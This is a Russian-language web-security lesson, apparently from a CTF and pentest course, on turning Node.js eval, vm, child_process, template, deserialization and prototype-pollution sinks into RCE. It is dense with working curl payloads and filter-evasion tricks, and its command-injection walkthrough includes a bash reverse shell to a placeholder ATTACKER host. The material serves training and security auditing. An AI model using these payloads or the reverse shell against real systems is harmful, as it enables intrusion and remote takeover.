---
id: web-nodejs-injection
title: "Серверные инъекции в Node.js: eval, vm, child_process"
category: web
parent: web-command-injection
difficulty: hard
order: 2
tags: [nodejs, eval, vm, child_process, injection, rce]
prerequisites: [web-command-injection]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "Node.js-специфичные sinks: eval, Function, vm/vm2 sandbox escape, child_process, template literals, prototype pollution → RCE."
---

Node.js — среда, где JavaScript исполняется на сервере, и многие функции, безопасные в браузере, на сервере становятся критичными. `eval`, `vm`, `child_process`, десериализация и шаблонизаторы превращают «ввод пользователя» в исполнение кода. Этот урок — про серверные инъекции в Node.js: где они возникают, как их находить и как доводить до RCE.

## Почему Node.js особенно опасен

В браузере `eval` ограничен песочницей страницы: он может исполнить код, но не выйти за пределы origin. На сервере тот же `eval` исполняет код с правами процесса — с доступом к файловой системе, сети, переменным окружения и дочерним процессам. Кроме того, экосистема Node.js поощряет динамическое исполнение: шаблонизаторы (`ejs`, `pug`, `handlebars`), сборщики, конфигурации на JS, плагины. Всё это — потенциальные точки инъекции, если ввод попадает в шаблон или в `eval`-подобную функцию.

Отдельно стоит `child_process`: даже без `eval` приложение может вызывать системные команды (`exec`, `spawn`, `execSync`) и склеивать команду из пользовательского ввода — это классическая command injection.

## Sink 1: eval и Function

```js
// уязвимо
app.get('/calc', (req, res) => res.send(eval(req.query.expr)));
// тоже уязвимо
const fn = new Function('return ' + req.query.expr);
// setTimeout со строкой
setTimeout(req.query.code, 100);
```

Проверка:

```bash
curl -s 'https://t/calc?expr=1%2B1'                       # 2
curl -s 'https://t/calc?expr=process.version'            # версия -> доступ к процессу
curl -s 'https://t/calc?expr=require("child_process").execSync("id").toString()'
# uid=0(root) ... -> RCE
```

## Sink 2: vm и vm2

Модуль `vm` позиционируется как «песочница», но **не является** границей безопасности. Побег из `vm` — известный класс техник.

```js
const vm = require('vm');
vm.runInNewContext(req.query.code, {});   // уязвимо: песочница не защищает
```

Побег через `constructor.constructor`:

```bash
curl -s 'https://t/run?code=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()'
```

Библиотека `vm2` добавляла реальную изоляцию, но и она неоднократно обходилась (CVE-2023-29017 и др.). Если приложение использует `vm2` старой версии — проверяйте известные побеги.

## Sink 3: child_process

```js
const { exec } = require('child_process');
app.get('/ping', (req, res) => exec(`ping -c1 ${req.query.host}`, (e,o)=>res.send(o)));
```

Инъекция через разделители команд:

```bash
curl -s 'https://t/ping?host=127.0.0.1;id'           # ; последовательность
curl -s 'https://t/ping?host=127.0.0.1|id'           # пайп
curl -s 'https://t/ping?host=$(id)'                  # подстановка
curl -s 'https://t/ping?host=`id`'                   # бэктики
curl -s 'https://t/ping?host=127.0.0.1%0aid'         # перевод строки
```

Разница между `exec` и `spawn`: `exec` запускает shell, поэтому разделители работают; `spawn` с массивом аргументов и без `shell:true` — безопаснее. Проверяйте, какой именно вызов используется.

## Sink 4: шаблонизаторы

`ejs` с `render` из пользовательского шаблона, `pug` с `compile`, `handlebars` с `compile` — всё это потенциальный SSTI.

```bash
# EJS
curl -s 'https://t/render?tpl=<%=7*7%>'                 # 49 -> SSTI
curl -s 'https://t/render?tpl=<%=process.mainModule.require("child_process").execSync("id")%>'
# Handlebars (известная цепочка)
curl -s 'https://t/render?tpl={{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\"child_process\").execSync(\"id\")"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}'
```

## Sink 5: десериализация

`node-serialize` и `funcster` исполняют код при десериализации, если строка начинается с `_$$ND_FUNC$$_`.

```js
const serialize = require('node-serialize');
serialize.unserialize(req.body.data);    // RCE
```

Payload:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id');}()"}
```

Подробнее — в уроке про Node.js deserialization.

## Инструменты

```bash
# поиск sink'ов в исходниках (если есть .git/бэкапы)
grep -rnE 'eval\(|new Function|child_process|vm\.run|require\(.*req\.' src/
# проверка прототип-загрязнения
curl -s https://t/api -H 'Content-Type: application/json' -d '{"__proto__":{"polluted":1}}'
# nuclei по Node-тегам
nuclei -u https://t -tags nodejs,cve -silent
```

## Разобранный пример: command injection → RCE

```bash
# 1. эндпоинт пинга
$ curl -s 'https://t/api/ping?host=127.0.0.1'
PING 127.0.0.1 ... 1 packets transmitted, 1 received

# 2. проверяем разделитель
$ curl -s 'https://t/api/ping?host=127.0.0.1;id'
PING ... uid=33(www-data) gid=33(www-data)

# 3. обратный шелл
$ curl -s "https://t/api/ping?host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
# на listener: shell
```

Артефакт — вывод `id` или интерактивный шелл.

## Разобранный пример: vm escape

```bash
$ curl -s 'https://t/run?code=this.constructor.constructor("return process")().env'
{ ... переменные окружения, включая секреты ... }
$ curl -s 'https://t/run?code=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()'
uid=0(root)
```

## Крайние случаи и подводные камни

- **`vm` — не песочница.** Не доверяйте ему; `vm2` тоже обходился.
- **`exec` vs `spawn`.** Первый запускает shell (разделители работают), второй — нет (если без `shell:true`).
- **`require` недоступен** в некоторых контекстах — используйте `process.mainModule.require` или `module.constructor._load`.
- **WAF на `child_process`** — разбивайте строку, используйте `concat`, юникод, `String.fromCharCode`.
- **`--experimental-permission`** в новых Node ограничивает доступ — учитывайте версию.
- **Шаблонизатор может быть «безопасным»** (auto-escape) — SSTI всё равно возможен через специфичные конструкции.

## Что делать дальше / решение

1. **Найдите sink** — грепните исходники (если доступны) или проверьте параметры, идущие в команды/шаблоны.
2. **Проверьте арифметику** (`{{7*7}}`, `1+1`) — признак исполнения.
3. **Проверьте доступ к процессу** — `process.version`, `process.env`.
4. **Добейте до RCE** — `child_process.execSync`.
5. **Обойдите фильтры** — кодирование, `concat`, `String.fromCharCode`.
6. **Стабилизируйте** — обратный шелл, persistence.
7. **Тупик** — переходите к десериализации (node-serialize) или prototype pollution.

## Справочная таблица

| Sink | Признак | Payload |
|------|---------|---------|
| `eval` | `expr=1+1` → 2 | `process.version` |
| `new Function` | вычисление | `require("child_process")` |
| `vm.runIn*` | «песочница» | `constructor.constructor` |
| `child_process.exec` | вывод команды | `;id`, `\|id`, `$(id)` |
| шаблонизатор | `{{7*7}}` → 49 | `<%= process... %>` |
| `node-serialize` | `_$$ND_FUNC$$_` | IIFE в JSON |

## Глубже: прототип-загрязнение как путь к RCE

В Node.js прототип-загрязнение (prototype pollution) часто становится первым шагом к RCE. Если приложение рекурсивно сливает пользовательский JSON в объект (типичный merge без защиты от `__proto__`), атакующий загрязняет `Object.prototype` и затем влияет на внутренние механизмы Node. Известная цепочка: загрязнение свойств `shell`, `argv`, `NODE_OPTIONS` или `env` приводит к исполнению команды через `child_process`.

```bash
# проверяем, загрязняется ли прототип
curl -s https://t/api -H 'Content-Type: application/json' -d '{"__proto__":{"polluted":"yes"}}'
curl -s https://t/api/reflect | grep -i polluted    # если появилось -> загрязнение
```

Классический вектор — загрязнить `Object.prototype.shell = "/proc/self/exe"` и `Object.prototype.argv = ["node","-e","require('child_process').execSync('id')"]`, после чего любой вызов `child_process` без явных опций исполнит ваш код. Подробнее — в уроке про prototype pollution → RCE.

## Глубже: обход фильтров в Node

Фильтры, блокирующие `child_process`, `require`, `eval`, обходятся несколькими способами. Строки можно собирать по частям (`"chi"+"ld_process"`), использовать `String.fromCharCode`, `Buffer.from(...).toString()`, юникод-эскейпы, шаблонные литералы. Доступ к модулям — через `process.mainModule.require`, `module.constructor._load`, `global.process.mainModule.require`. Для `eval`-подобных sink'ов можно задействовать `Function`, `setTimeout` со строкой, `setInterval`.

```bash
# сборка строки из частей
curl -s "https://t/calc?expr=require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115))"
# альтернативный доступ к require
curl -s "https://t/run?code=process.mainModule.require('child_process').execSync('id')"
# через конструктор
curl -s "https://t/run?code=[].constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"
```

Если WAF разбирает слова, разбейте их комментарием/конкатенацией; если блокирует символы — используйте юникод (`\u0065val`). Помните: Node.js — не браузер, здесь `eval` действительно опасен.

## Чек-лист аудита Node.js-приложений

- [ ] Найдены все `eval`/`new Function`/`setTimeout(string)`.
- [ ] Проверены `vm`/`vm2` (версия, побеги).
- [ ] Проверены вызовы `child_process` (exec/spawn/shell:true).
- [ ] Проверены шаблонизаторы (SSTI) и их версии.
- [ ] Проверена десериализация (`node-serialize`, `funcster`).
- [ ] Проверено прототип-загрязнение (merge, `__proto__`).
- [ ] Проверены обходы фильтров (сборка строк, `String.fromCharCode`).
- [ ] Найденный sink доведён до артефакта (`id`).

## Разобранный пример: прототип-загрязнение → RCE

Разберём полную цепочку, потому что она встречается чаще, чем прямой `eval`. Многие Node-приложения принимают JSON и рекурсивно сливают его в объект настроек. Если merge не защищён от ключа `__proto__`, атакующий загрязняет прототип и меняет поведение встроенных модулей.

```bash
# 1. подтверждаем загрязнение
$ curl -s https://t/api/settings -X POST -H 'Content-Type: application/json' \
    -d '{"__proto__":{"pp_test":"yes"}}'
$ curl -s https://t/api/settings | grep pp_test
"pp_test":"yes"        # прототип загрязнён

# 2. загрязняем опции child_process
$ curl -s https://t/api/settings -X POST -H 'Content-Type: application/json' -d '{
    "__proto__":{"shell":"/proc/self/exe","argv":["node","-e","require(\"child_process\").execSync(\"id\").toString()"]}}'

# 3. провоцируем любой вызов child_process без опций
$ curl -s https://t/api/export
uid=0(root) gid=0(root)     # RCE через загрязнённый прототип
```

Ключевой момент: само загрязнение не выполняет код. Нужен «триггер» — любой участок, который вызывает `child_process` или `eval` и полагается на свойства из прототипа. Ищите такие триггеры в приложении: экспорт данных, конвертация, вызовы внешних утилит. Именно комбинация загрязнения и триггера даёт RCE, и её часто упускают, считая прототип-загрязнение «низким» баг-классом.

## Итог и приоритизация

Наиболее критичны прямые sink'и: `eval`, `new Function`, `child_process.exec` с пользовательским вводом — это мгновенный RCE. Далее — побег из `vm`/`vm2` и SSTI в шаблонизаторах. Затем — десериализация и прототип-загрязнение (требуют триггера, но дают RCE в связке). При отчёте всегда показывайте артефакт (`id`, версия процесса, переменные окружения) и минимальный PoC одной командой `curl`. И помните о гигиене: скачанные payload'ы и PoC — недоверенный код, читайте их перед запуском.

Отдельно стоит сказать про изоляцию: если приложение исполняет пользовательский код «в песочнице» на Node.js, это почти всегда небезопасно. Настоящая изоляция требует отдельного процесса с ограничениями ОС (`--experimental-permission`, seccomp, контейнер без сети и файловой системы). Node-модули `vm` и даже `vm2` для этого недостаточны, что подтверждено десятками CVE. Поэтому при аудите любого «playground»/«sandbox»-эндпоинта исходите из того, что он даёт RCE, и проверяйте это целенаправленно.

## Квиз

```quiz
- question: "Почему vm в Node.js не является sandbox?"
  options:
    - "Он медленный"
    - "Документировано как небезопасный, escape через constructor"
    - "Он шифрует"
    - "Он без eval"
  answer: 1
  explanation: "vm — не граница безопасности."
- question: "Какой payload выполняет команду при отсутствии require?"
  options:
    - "eval('id')"
    - "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"
    - "process.exit()"
    - "console.log('id')"
  answer: 1
  explanation: "Доступ через конструктор Function."
- question: "Чем опасен child_process.exec с вводом?"
  options:
    - "Он медленный"
    - "Команда интерполируется в shell -> command injection"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "exec запускает shell."
- question: "Как prototype pollution может дать RCE?"
  options:
    - "Никак"
    - "Загрязнение Object.prototype влияет на gadgets в ejs/pug/child_process"
    - "Меняет TLS"
    - "Сбрасывает кеш"
  answer: 1
  explanation: "Цепочка через опции рендера/процесса."
- question: "Какая библиотека-«sandbox» исторически ломалась CVE-2023-*?"
  options:
    - "lodash"
    - "vm2"
    - "express"
    - "axios"
  answer: 1
  explanation: "vm2 неоднократно обходился."
```

## Где пригодится

- **CTF (Web):** задачи на Node-калькуляторы/vm.
- **Bug bounty:** RCE в Node-сервисах.
- **Пентест:** аудит Node.js-приложений.
- **Работа (AppSec):** запрет eval/vm, обновление vm2, параметризация child_process.
